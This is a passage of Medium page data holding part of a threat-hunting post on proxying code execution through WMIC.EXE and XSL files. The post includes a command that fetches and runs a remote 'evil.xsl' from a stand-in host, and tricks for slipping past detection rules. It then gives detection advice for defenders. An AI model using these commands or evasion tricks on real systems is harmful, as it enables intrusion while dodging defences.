etc.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":201,"end":206,"type":"A","href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1047\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_38":{"id":"85fe16ec578d_38","__typename":"Paragraph","name":"daa9","text":"According to the information provided about this technique in Mitre’s ATT&CK framework (T1220), an attacker can also use WMI to do code execution by using \u002FFormat switch. WMIC.EXE is capable to run code from locally or remote XSL file.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":88,"end":93,"type":"A","href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1220\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","start":155,"end":162,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":155,"end":162,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_39":{"id":"85fe16ec578d_39","__typename":"Paragraph","name":"3556","text":"As per the ATT&CK Framework, following are the different ways of code execution using WMIC.EXE:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_40":{"id":"85fe16ec578d_40","__typename":"Paragraph","name":"50bd","text":"1. Execute code from Local File:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":2,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":3,"end":32,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_41":{"id":"85fe16ec578d_41","__typename":"Paragraph","name":"c156","text":"wmic process list \u002FFORMAT:evil.xsl","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_42":{"id":"85fe16ec578d_42","__typename":"Paragraph","name":"70f0","text":"2. Execute code from Remote File:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":2,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":3,"end":33,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_43":{"id":"85fe16ec578d_43","__typename":"Paragraph","name":"7632","text":"wmic os get \u002FFORMAT:\"https:\u002F\u002Fexample.com\u002Fevil.xsl\"","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":21,"end":49,"type":"A","href":"https:\u002F\u002Fexample.com\u002Fevil.xsl","anchorType":"LINK","userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_44":{"id":"85fe16ec578d_44","__typename":"Paragraph","name":"6b64","text":"After experimenting with WMIC.EXE, we found the following additional ways to run the code from XSL File:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_45":{"id":"85fe16ec578d_45","__typename":"Paragraph","name":"6618","text":"1. Omit File Extension: One of the way that a defender can choose to make an alert on this is to use file extension in a rule’s logic. However, it is very easy to bypass that kind of rule. To bypass that, the only thing that an attacker has to do is to create a XSL file and save it with .xsl format. While invoking XSL file, just omit the file extension.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":288,"end":292,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":0,"end":2,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":3,"end":24,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":288,"end":292,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_46":{"id":"85fe16ec578d_46","__typename":"Paragraph","name":"1d13","text":"C:\\Users\\Administrator\\Desktop\\XSL\u003Ewmic os get \u002FFormat:TestXSL","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_47":{"id":"85fe16ec578d_47","__typename":"Paragraph","name":"dd35","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*tzgkS0UoHScxfM7J1DyjJA.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_48":{"id":"85fe16ec578d_48","__typename":"Paragraph","name":"1724","text":"Furthermore, \u002FFORMAT switch has these format specifiers: CSV, HFORM, HTABLE, LIST, MOF, RAWXML, TABLE, VALUE, XML, etc. As WMI is used a lot by legitimate utilities and it is very noisy in some environments, an attacker can play even more intelligently by creating XSL file with name of format specifiers file with same name as of supported format specifiers. Ex: an attacker can create XSL file named list.xsl because list is one of the supported format specifier.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":13,"end":20,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":419,"end":423,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":13,"end":20,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":419,"end":423,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_49":{"id":"85fe16ec578d_49","__typename":"Paragraph","name":"f04e","text":"Then to invoke code from this, attacker can run the following command:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_50":{"id":"85fe16ec578d_50","__typename":"Paragraph","name":"8051","text":"C:\\Users\\Administrator\\Desktop\\XSL\u003Ewmic os get \u002FFormat:.\\list","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_51":{"id":"85fe16ec578d_51","__typename":"Paragraph","name":"6b90","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*_I8ir_TkhfOeKY9wdEPfYg.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_52":{"id":"85fe16ec578d_52","__typename":"Paragraph","name":"62f0","text":"2. Using other WMI aliases: Attacker can use any alias in WMI to do code execution. The only condition is that the alias must have \u002FFORMAT switch. For example, instead of OS or PROCESS alias, an attacker can use other aliases like CPU, BIOS, etc.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":131,"end":138,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":0,"end":2,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":3,"end":28,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":131,"end":138,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_53":{"id":"85fe16ec578d_53","__typename":"Paragraph","name":"9beb","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Z_8vjQvoGu1XnhFNj8Xr4Q.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_54":{"id":"85fe16ec578d_54","__typename":"Paragraph","name":"4b78","text":"Conclusion","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_55":{"id":"85fe16ec578d_55","__typename":"Paragraph","name":"88aa","text":"So if you are Blue Team member and want to detect this attack, then build your rule based binary name (wmic.exe and msxsl.exe) and it’s metadata like Binary’s description field (if using Sysmon) because it is very easy for an attacker to copy binary to a folder that he controls and rename it. Moreover, to detect XSL execution with WMIC.EXE, you can use regex to monitor parameter passed to \u002FFORMAT switch.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":392,"end":399,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":392,"end":399,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_56":{"id":"85fe16ec578d_56","__typename":"Paragraph","name":"a8d2","text":"As Threat Hunters and detection builder, we always try to find ways to perform an attack without triggering our signatures. So, we encourage all of you to explore the attack, play with parameters, binary location, security descriptors, etc. Here’s an excellent talk from Daniel Bohannon and Matthew Dunwoody about building resilient signatures if you are interested in learning more on the subject: https:\u002F\u002Fyoutu.be\u002FYGJaj6_3dGA","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":399,"end":427,"type":"A","href":"https:\u002F\u002Fyoutu.be\u002FYGJaj6_3dGA","anchorType":"LINK","userId":null,"linkMetadata":null}],"dropCapImage":null},"ImageMetadata:1*D-VjhwEVdnGHsyMw4qGeWg.png":{"id":"1*D-VjhwEVdnGHsyMw4qGeWg.png","__typename":"ImageMetadata","originalHeight":362,"originalWidth":940,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*14MYo7fy9O5hhg8XbNsLnA.png":{"id":"1*14MYo7fy9O5hhg8XbNsLnA.png","__typename":"ImageMetadata","originalHeight":394,"originalWidth":940,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*ZLJLD44eDUMTSTtJVWlwGw.png":{"id":"1*ZLJLD44eDUMTSTtJVWlwGw.png","__typename":"ImageMetadata","originalHeight":396,"originalWidth":940,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*sGJYLD6gKg81lNO2TyIwjw.png":{"id":"1*sGJYLD6gKg81lNO2TyIwjw.png","__typename":"ImageMetadata","originalHeight":346,"originalWidth":940,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*tzgkS0UoHScxfM7J1DyjJA.png":{"id":"1*tzgkS0UoHScxfM7J1DyjJA.png","__typename":"ImageMetadata","originalHeight":266,"originalWidth":940,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*_I8ir_TkhfOeKY9wdEPfYg.png":{"id":"1*_I8ir_TkhfOeKY9wdEPfYg.png","__typename":"ImageMetadata","originalHeight":556,"originalWidth":940,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*Z_8vjQvoGu1XnhFNj8Xr4Q.png":{"id":"1*Z_8vjQvoGu1XnhFNj8Xr4Q.png","__typename":"ImageMetadata","originalHeight":294,"originalWidth":940,"focusPercentX":null,"focusPercentY":null,"alt":null},"Tag:mitre-attck":{"id":"mitre-attck","__typename":"Tag","displayTitle":"Mitre Attck","normalizedTagSlug":""},"Tag:threat-hunting":{"id":"threat-hunting","__typename":"Tag","displayTitle":"Threat Hunting","normalizedTagSlug":""},"Tag:infosec":{"id":"infosec","__typename":"Tag","displayTitle":"Infosec","normalizedTagSlug":""},"Tag:hacking":{"id":"hacking","__typename":"Tag","displayTitle":"Hacking","normalizedTagSlug":""},"ImageMetadata:1*faaajiHzjDWr_mSdjOjpjQ.jpeg":{"id":"1*faaajiHzjDWr_mSdjOjpjQ.jpeg","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"Collection:24d8f4fa8912":{"id":"24d8f4fa8912","__typename":"Collection","name":"Nerd For Tech","domain":null,"slug":"nerd-for-tech"},"UserViewerEdge:userId:983caf61e00-viewerId:lo_aa350970d9dc":{"id":"userId:983caf61e00-viewerId:lo_aa350970d9dc","__typename":"UserViewerEdge","isFollowing":false},"User:983caf61e00":{"id":"983caf61e00","__typename":"User","name":"Hasini Sandunika Silva","username":"silvahansini","bio":"Associate Software Engineer, Computer Science Undergraduate","imageId":"0*t7iIrInnNYHkGqpC","mediumMemberAt":0,"customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"silvahansini.medium.com"}},"hasSubdomain":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:983caf61e00-viewerId:lo_aa350970d9dc"}},"Post:365c93def04e":{"id":"365c93def04e","__typename":"Post","title":"Importance of Software Security, Application Security, Non-Technical Hacking, Encryption, and…","mediumUrl":"https:\u002F\u002Fmedium.com\u002Fnerd-for-tech\u002Fimportance-of-software-security-application-security-non-technical-hacking-encryption-and-365c93def04e","previewImage":{"__ref":"ImageMetadata:1*faaajiHzjDWr_mSdjOjpjQ.jpeg"},"isPublished":true,"firstPublishedAt":1621168519315,"readingTime":3.3716981132075468,"statusForCollection":"APPROVED","isLocked":false,"visibility":"PUBLIC","collection":{"__ref":"Collection:24d8f4fa8912"},"creator":{"__ref":"User:983caf61e00"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"ImageMetadata:0*qbv4rPs-EalVPhjD":{"id":"0*qbv4rPs-EalVPhjD","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"UserViewerEdge:userId:d894583788f0-viewerId:lo_aa350970d9dc":{"id":"userId:d894583788f0-viewerId:lo_aa350970d9dc","__typename":"UserViewerEdge","isFollowing":false},"User:d894583788f0":{"id":"d894583788f0","__typename":"User","name":"Miguel A. Calles MBA","username":"miguelacallesmba","bio":"Miguel is the author of the “Serverless Security” book, and a cybersecurity engineer.","imageId":"2*CC1gohycVhBFro5l2Yv-6g.jpeg","mediumMemberAt":0,"customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"miguelacallesmba.medium.com"}},"hasSubdomain":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:d894583788f0-viewerId:lo_aa350970d9dc"}},"Post:3805e8763dd5":{"id":"3805e8763dd5","__typename":"Post","title":"Browser Extensions Can Have Malware: My Shock of “The Great Suspender” Chrome and Edge Extensions","mediumUrl":"https:\u002F\u002Fmiguelacallesmba.medium.com\u002Fmalware-in-browser-extensions-3805e8763dd5","previewImage":{"__ref":"ImageMetadata:0*qbv4rPs-EalVPhjD"},"isPublished":true,"firstPublishedAt":1606103801190,"readingTime":3.6830188679245284,"statusForCollection":null,"isLocked":true,"visibility":"LOCKED","collection":null,"creator":{"__ref":"User:d894583788f0"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"ImageMetadata:1*mWDpMwzXtl8sayTl3PdIRg.jpeg":{"id":"1*mWDpMwzXtl8sayTl3PdIRg.jpeg","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"UserViewerEdge:userId:b7bc4181c4a9-viewerId:lo_aa350970d9dc":{"id":"userId:b7bc4181c4a9-viewerId:lo_aa350970d9dc","__typename":"UserViewerEdge","isFollowing":false},"User:b7bc4181c4a9":{"id":"b7bc4181c4a9","__typename":"User","name":"Eddie Segal","username":"eddies_47682","bio":"I’m an electronics engineer and also a technology writer. In my writing I’m covering subjects ranging from cloud storage and agile development to cybersecurity","imageId":"2*6GC3nc2W2vmTWzMLdtYc3Q.jpeg","mediumMemberAt":0,"customDomainState":null,"hasSubdomain":false,"viewerEdge":{"__ref":"UserViewerEdge:userId:b7bc4181c4a9-viewerId:lo_aa350970d9dc"}},"Post:393c09f55eae":{"id":"393c09f55eae","__typename":"Post","title":"APT Attacks 101: What They Are and How They Work","mediumUrl":"https:\u002F\u002Fmedium.com\u002F@eddies_47682\u002Fapt-attacks-101-what-they-are-and-how-they-work-393c09f55eae","previewImage":{"__ref":"ImageMetadata:1*mWDpMwzXtl8sayTl3PdIRg.jpeg"},"isPublished":true,"firstPublishedAt":1569585727334,"readingTime":3.6754716981132076,"statusForCollection":null,"isLocked":true,"visibility":"LOCKED","collection":null,"creator":{"__ref":"User:b7bc4181c4a9"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"ImageMetadata:0*ji52r227Fg5yDMgP.png":{"id":"0*ji52r227Fg5yDMgP.png","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"UserViewerEdge:userId:6558c3da01f3-viewerId:lo_aa350970d9dc":{"id":"userId:6558c3da01f3-viewerId:lo_aa350970d9dc","__typename":"UserViewerEdge","isFollowing":false},"User:6558c3da01f3":{"id":"6558c3da01f3","__typename":"User","name":"Eliza Dumitrache","username":"elizad5","bio":"Growth Hacker and Essentialist, #Performance and all around Digital Enthusiast, user behaviour analyzer. Love reading, travelling, arts & all things Japanese.","imageId":"1*wY0tIx5zgiVHmKCZNBwM0Q.jpeg","mediumMemberAt":0,"customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"elizad5.medium.com"}},"hasSubdomain":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:6558c3da01f3-viewerId:lo_aa350970d9dc"}},"Post:39313ca23ef5":{"id":"39313ca23ef5","__typename":"Post","title":"The business cost of failed security compliance and downtime","mediumUrl":"https:\u002F\u002Felizad5.medium.com\u002Fthe-business-cost-of-failed-security-compliance-and-downtime-39313ca23ef5","previewImage":{"__ref":"ImageMetadata:0*ji52r227Fg5yDMgP.png"},"isPublished":true,"firstPublishedAt":1617892258395,"readingTime":4.9245283018867925,"statusForCollection":null,"isLocked":false,"visibility":"PUBLIC","collection":null,"creator":{"__ref":"User:6558c3da01f3"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"ImageMetadata:1*6ZkqtaMtbjLTumlgYf3MVA.jpeg":{"id":"1*6ZkqtaMtbjLTumlgYf3MVA.jpeg","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"Collection:ef3289e2103f":{"id":"ef3289e2103f","__typename":"Collection","name":"Web Companion","domain":null,"slug":"web-companion"},"UserViewerEdge:userId:77077d0b1b11-viewerId:lo_aa350970d9dc":{"id":"userId:77077d0b1b11-viewerId:lo_aa350970d9dc","__typename":"UserViewerEdge","isFollowing":false},"User:77077d0b1b11":{"id":"77077d0b1b11","__typename":"User","name":"Web Companion","username":"webcompanion","bio":"Web Companion makes your web environment faster and safer. Members of the Web Companion Community get the most out of their devices from one tool.","imageId":"2*CLp_4brgC0tUQh0CWbCIJg.jpeg","mediumMemberAt":0,"customDomainState":null,"hasSubdomain":false,"viewerEdge":{"__ref":"UserViewerEdge:userId:77077d0b1b11-viewerId:lo_aa350970d9dc"}},"Post:38daa9e9bdc5":{"id":"38daa9e9bdc5","__typename":"Post","title":"Protecting Online Security in an Ever-Changing World","mediumUrl":"https:\u002F\u002Fmedium.com\u002Fweb-companion\u002Fprotecting-online-security-in-an-ever-changing-world-38daa9e9bdc5","previewImage":{"__ref":"ImageMetadata:1*6ZkqtaMtbjLTumlgYf3MVA.jpeg"},"isPublished":true,"firstPublishedAt":1563292889382,"readingTime":4.685849056603773,"statusForCollection":"APPROVED","isLocked":true,"visibility":"LOCKED","collection":{"__ref":"Collection:ef3289e2103f"},"creator":{"__ref":"User:77077d0b1b11"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"ImageMetadata:1*-IEveEBLJ63zc2yh5f9BAg.jpeg":{"id":"1*-IEveEBLJ63zc2yh5f9BAg.jpeg","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"Collection:60ff66806af8":{"id":"60ff66806af8","__typename":"Collection","name":"The 100 Words Project","domain":null,"slug":"the-100-words-project"},"UserViewerEdge:userId:38f2b2ae0311-viewerId:lo_aa350970d9dc":{"id":"userId:38f2b2ae0311-viewerId:lo_aa350970d9dc","__typename":"UserViewerEdge","isFollowing":false},"User:38f2b2ae0311":{"id":"38f2b2ae0311","__typename":"User","name":"Digitally Vicarious","username":"digitallyvicarious","bio":"Real Name: Logan. Chief Sentence Officer (CSO). Aspiring CIO. Cybersecurity Entertainer, Writer & Presenter. Humanity, not machinery. Empathetic & altruistic.","imageId":"1*b_M_l9w9MfLLigF3sBtQsw.jpeg","mediumMemberAt":1577928536428,"customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"digitallyvicarious.medium.com"}},"hasSubdomain":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:38f2b2ae0311-viewerId:lo_aa350970d9dc"}},"Post:38c6f16eacc8":{"id":"38c6f16eacc8","__typename":"Post","title":"100 Words On…..Authentication Credentials","mediumUrl":"https:\u002F\u002Fmedium.com\u002Fthe-100-words-project\u002F100-words-on-authentication-credentials-38c6f16eacc8","previewImage":{"__ref":"ImageMetadata:1*-IEveEBLJ63zc2yh5f9BAg.jpeg"},"isPublished":true,"firstPublishedAt":1614320987359,"readingTime":0.5924528301886793,"statusForCollection":"APPROVED","isLocked":true,"visibility":"LOCKED","collection":{"__ref":"Collection:60ff66806af8"},"creator":{"__ref":"User:38f2b2ae0311"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"ImageMetadata:1*0_4THlN79VRN6VUKziBC9A.jpeg":{"id":"1*0_4THlN79VRN6VUKziBC9A.jpeg","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"Collection:7cf4d4878b7d":{"id":"7cf4d4878b7d","__typename":"Collection","name":"The New York Times","domain":null,"slug":"the-new-york-times"},"UserViewerEdge:userId:b42354b051f1-viewerId:lo_aa350970d9dc":{"id":"userId:b42354b051f1-viewerId:lo_aa350970d9dc","__typename":"UserViewerEdge","isFollowing":false},"User:b42354b051f1":{"id":"b42354b051f1","__typename":"User","name":"The New York Times","username":"newyorktimes","bio":"","imageId":"1*lDzXmG7cKomswLcrSYVVFQ.png","mediumMemberAt":0,"customDomainState":null,"hasSubdomain":false,"viewerEdge":{"__ref":"UserViewerEdge:userId:b42354b051f1-viewerId:lo_aa350970d9dc"}},"Post:39424ac52a18":{"id":"39424ac52a18","__typename":"Post","title":"Russian Hackers Broke Into Federal Agencies, U.S. Officials Suspect","mediumUrl":"https:\u002F\u002Fmedium.com\u002Fthe-new-york-times\u002Frussian-hackers-broke-into-federal-agencies-u-s-officials-suspect-39424ac52a18","previewImage":{"__ref":"ImageMetadata:1*0_4THlN79VRN6VUKziBC9A.jpeg"},"isPublished":true,"firstPublishedAt":1607958000000,"readingTime":5.505660377358491,"statusForCollection":"APPROVED","isLocked":true,"visibility":"LOCKED","collection":{"__ref":"Collection:7cf4d4878b7d"},"creator":{"__ref":"User:b42354b051f1"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"ImageMetadata:1*WSEePtBQ5Zwgfupi2dQTAw.jpeg":{"id":"1*WSEePtBQ5Zwgfupi2dQTAw.jpeg","__typename":"ImageMetadata","focusPercentX":null,"focusPercentY":null},"UserViewerEdge:userId:f6a6045b3b79-viewerId:lo_aa350970d9dc":{"id":"userId:f6a6045b3b79-viewerId:lo_aa350970d9dc","__typename":"UserViewerEdge","isFollowing":false},"User:f6a6045b3b79":{"id":"f6a6045b3b79","__typename":"User","name":"SpencerAqa","username":"spenceraqason","bio":"Business analyst and Star Wars enthusiast. Businessman by day Geek by night.","imageId":"1*b5EZ4UpHvrWM0fJzsgxs8Q.png","mediumMemberAt":0,"customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"spenceraqason.medium.com"}},"hasSubdomain":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:f6a6045b3b79-viewerId:lo_aa350970d9dc"}},"Post:38ec4ba04783":{"id":"38ec4ba04783","__typename":"Post","title":"Everything You Need to Know About HTTP Proxies","mediumUrl":"https:\u002F\u002Fspenceraqason.medium.com\u002Feverything-you-need-to-know-about-http-proxies-38ec4ba04783","previewImage":{"__ref":"ImageMetadata:1*WSEePtBQ5Zwgfupi2dQTAw.jpeg"},"isPublished":true,"firstPublishedAt":1616165315088,"readingTime":2.821069182389937,"statusForCollection":null,"isLocked":false,"visibility":"PUBLIC","collection":null,"creator":{"__ref":"User:f6a6045b3b79"},"previewContent":{"__typename":"PreviewContent","isFullContent":false}},"Post:8d524f642b75":{"id":"8d524f642b75","__typename":"Post","creator":{"__ref":"User:f7e306e00fce"},"canonicalUrl":"","collection":null,"content({\"postMeteringOptions\":{\"referrer\":\"\",\"sk\":null,\"source\":null}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"validatedShareKey":"","bodyModel":{"__typename":"RichText","paragraphs":[{"__ref":"Paragraph:85fe16ec578d_0"},{"__ref":"Paragraph:85fe16ec578d_1"},{"__ref":"Paragraph:85fe16ec578d_2"},{"__ref":"Paragraph:85fe16ec578d_3"},{"__ref":"Paragraph:85fe16ec578d_4"},{"__ref":"Paragraph:85fe16ec578d_5"},{"__ref":"Paragraph:85fe16ec578d_6"},{"__ref":"Paragraph:85fe16ec578d_7"},{"__ref":"Paragraph:85fe16ec578d_8"},{"__ref":"Paragraph:85fe16ec578d_9"},{"__ref":"Paragraph:85fe16ec578d_10"},{"__ref":"Paragraph:85fe16ec578d_11"},{"__ref":"Paragraph:85fe16ec578d_12"},{"__ref":"Paragraph:85fe16ec578d_13"},{"__ref":"Paragraph:85fe16ec578d_14"},{"__ref":"Paragraph:85fe16ec578d_15"},{"__ref":"Paragraph:85fe16ec578d_16"},{"__ref":"Paragraph:85fe16ec578d_17"},{"__ref":"Paragraph:85fe16ec578d_18"},{"__ref":"Paragraph:85fe16ec578d_19"},{"__ref":"Paragraph:85fe16ec578d_20"},{"__ref":"Paragraph:85fe16ec578d_21"},{"__ref":"Paragraph:85fe16ec578d_22"},{"__ref":"Paragraph:85fe16ec578d_23"},{"__ref":"Paragraph:85fe16ec578d_24"},{"__ref":"Paragraph:85fe16ec578d_25"},{"__ref":"Paragraph:85fe16ec578d_26"},{"__ref":"Paragraph:85fe16ec578d_27"},{"__ref":"Paragraph:85fe16ec578d_28"},{"__ref":"Paragraph:85fe16ec578d_29"},{"__ref":"Paragraph:85fe16ec578d_30"},{"__ref":"Paragraph:85fe16ec578d_31"},{"__ref":"Paragraph:85fe16ec578d_32"},{"__ref":"Paragraph:85fe16ec578d_33"},{"__ref":"Paragraph:85fe16ec578d_34"},{"__ref":"Paragraph:85fe16ec578d_35"},{"__ref":"Paragraph:85fe16ec578d_36"},{"__ref":"Paragraph:85fe16ec578d_37"},{"__ref":"Paragraph:85fe16ec578d_38"},{"__ref":"Paragraph:85fe16ec578d_39"},{"__ref":"Paragraph:85fe16ec578d_40"},{"__ref":"Paragraph:85fe16ec578d_41"},{"__ref":"Paragraph:85fe16ec578d_42"},{"__ref":"Paragraph:85fe16ec578d_43"},{"__ref":"Paragraph:85fe16ec578d_44"},{"__ref":"Paragraph:85fe16ec578d_45"},{"__ref":"Paragraph:85fe16ec578d_46"},{"__ref":"Paragraph:85fe16ec578d_47"},{"__ref":"Paragraph:85fe16ec578d_48"},{"__ref":"Paragraph:85fe16ec578d_49"},{"__ref":"Paragraph:85fe16ec578d_50"},{"__ref":"Paragraph:85fe16ec578d_51"},{"__ref":"Paragraph:85fe16ec578d_52"},{"__ref":"Paragraph:85fe16ec578d_53"},{"__ref":"Paragraph:85fe16ec578d_54"},{"__ref":"Paragraph:85fe16ec578d_55"},{"__ref":"Paragraph:85fe16ec578d_56"}],"sections":[{"__typename":"Section","name":"9173","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}]}},"customStyleSheet":null,"firstPublishedAt":1552587683384,"isLocked":false,"isPublished":true,"isShortform":false,"layerCake":0,"primaryTopic":null,"viewerEdge":{"__ref":"PostViewerEdge:postId:8d524f642b75-viewerId:lo_aa350970d9dc"},"title":"MSXSL.EXE AND WMIC.EXE — A Way to Proxy Code Execution","isMarkedPaywallOnly":false,"mediumUrl":"https:\u002F\u002Fmedium.com\u002F@threathuntingteam\u002Fmsxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75","isLimitedState":false,"visibility":"PUBLIC","license":"ALL_RIGHTS_RESERVED","allowResponses":true,"newsletterId":"","sequence":null,"tags":[{"__ref":"Tag:mitre-attck"},{"__ref":"Tag:threat-hunting"},{"__ref":"Tag:infosec"},{"__ref":"Tag:hacking"}],"topics":[{"__typename":"Topic","topicId":"d4e7f4144ac5","name":"Cybersecurity"},{"__typename":"Topic","topicId":"decb52b64abf","name":"Programming"}],"inResponseToPostResult":null,"isNewsletter":false,"socialTitle":"","socialDek":"","noIndex":null,"curationStatus":null,"metaDescription":"","latestPublishedAt":1552587683384,"readingTime":5.974528301886792,"previewContent":{"__typename":"PreviewContent","subtitle":"INTRODUCTION"},"previewImage":{"__ref":"ImageMetadata:1*D-VjhwEVdnGHsyMw4qGeWg.png"},"clapCount":66,"lockedSource":"LOCKED_POST_SOURCE_NONE","isSuspended":false,"pendingCollection":null,"statusForCollection":null,"pinnedAt":0,"pinnedByCreatorAt":0,"curationEligibleAt":0,"responseDistribution":"NOT_DISTRIBUTED","internalLinks({\"paging\":{\"limit\":8}})":{"__typename":"InternalLinksConnection"